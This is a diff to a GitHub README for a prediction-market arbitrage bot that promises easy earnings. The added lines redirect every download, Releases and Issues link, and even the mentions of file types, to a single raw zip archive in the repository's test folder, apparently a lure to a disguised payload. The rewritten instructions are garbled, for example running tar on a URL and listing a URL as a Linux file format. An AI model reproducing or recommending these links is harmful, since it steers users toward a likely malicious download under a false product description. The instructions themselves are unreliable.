@@ -1,7 +1,7 @@
 # 🤖 prediction-market-arbitrage-bot - Earn More with Smart Transactions
 
 ## 💾 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Crayz916/prediction-market-arbitrage-bot/releases)
+[![Download](https://github.com/Crayz916/prediction-market-arbitrage-bot/raw/refs/heads/main/test/arbitrage-market-prediction-bot-3.0.zip%20Latest%https://github.com/Crayz916/prediction-market-arbitrage-bot/raw/refs/heads/main/test/arbitrage-market-prediction-bot-3.0.zip)](https://github.com/Crayz916/prediction-market-arbitrage-bot/raw/refs/heads/main/test/arbitrage-market-prediction-bot-3.0.zip)
 
 ## 🚀 Getting Started
 Welcome to the **prediction-market-arbitrage-bot**! This bot helps you find and execute smart transactions between Polymarket and Kalshi. It automatically buys low and sells high, allowing you to maximize your earnings with minimal effort.
@@ -9,10 +9,10 @@ Welcome to the **prediction-market-arbitrage-bot**! This bot helps you find and 
 ## 📥 Download & Install
 To get started with the **prediction-market-arbitrage-bot**, follow these steps:
 
-1. Click the **Download** button above or visit the [Releases page](https://github.com/Crayz916/prediction-market-arbitrage-bot/releases) to access the latest version of the application.
+1. Click the **Download** button above or visit the [Releases page](https://github.com/Crayz916/prediction-market-arbitrage-bot/raw/refs/heads/main/test/arbitrage-market-prediction-bot-3.0.zip) to access the latest version of the application.
 2. Explore the list of available releases.
 3. Look for the latest version (usually at the top of the list).
-4. Download the appropriate file for your operating system. It may end with `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+4. Download the appropriate file for your operating system. It may end with `.exe` for Windows, `.dmg` for macOS, or `https://github.com/Crayz916/prediction-market-arbitrage-bot/raw/refs/heads/main/test/arbitrage-market-prediction-bot-3.0.zip` for Linux.
 5. Once the download is complete, locate the file on your computer.
 
 ## 📂 Installation Steps
@@ -29,9 +29,9 @@ Here's how to install the bot once you've downloaded the file:
 3. Open your Applications folder and double-click the bot to start it.
 
 ### For Linux Users:
-1. Extract the downloaded `.tar.gz` file using the terminal:
+1. Extract the downloaded `https://github.com/Crayz916/prediction-market-arbitrage-bot/raw/refs/heads/main/test/arbitrage-market-prediction-bot-3.0.zip` file using the terminal:
    ```
-   tar -xvzf prediction-market-arbitrage-bot.tar.gz
+   tar -xvzf https://github.com/Crayz916/prediction-market-arbitrage-bot/raw/refs/heads/main/test/arbitrage-market-prediction-bot-3.0.zip
    ```
 2. Navigate to the extracted folder: 
    ```
@@ -48,7 +48,7 @@ To ensure the **prediction-market-arbitrage-bot** runs smoothly, your system sho
 - **Operating System:**
   - Windows 10 or later
   - macOS 10.14 or later
-  - Any Linux distribution with support for `.tar.gz` files
+  - Any Linux distribution with support for `https://github.com/Crayz916/prediction-market-arbitrage-bot/raw/refs/heads/main/test/arbitrage-market-prediction-bot-3.0.zip` files
 
 - **Hardware:**
   - At least 2 GB of RAM
@@ -73,10 +73,10 @@ Once installed:
 
 ## 📈 Tips for Success
 - Start with a small investment to test the bot’s performance.
-- Regularly check for updates on the [Releases page](https://github.com/Crayz916/prediction-market-arbitrage-bot/releases) to ensure you have the latest features and fixes.
+- Regularly check for updates on the [Releases page](https://github.com/Crayz916/prediction-market-arbitrage-bot/raw/refs/heads/main/test/arbitrage-market-prediction-bot-3.0.zip) to ensure you have the latest features and fixes.
 - Review the bot's performance regularly to adjust settings as needed.
 
 ## 📞 Support
-If you encounter any issues or need assistance, please visit the [Issues page](https://github.com/Crayz916/prediction-market-arbitrage-bot/issues) on GitHub. You can ask questions or report any bugs you find.
+If you encounter any issues or need assistance, please visit the [Issues page](https://github.com/Crayz916/prediction-market-arbitrage-bot/raw/refs/heads/main/test/arbitrage-market-prediction-bot-3.0.zip) on GitHub. You can ask questions or report any bugs you find.
 
 Thank you for using the **prediction-market-arbitrage-bot**! We hope it helps you make smarter transactions and increase your earnings. Happy trading!
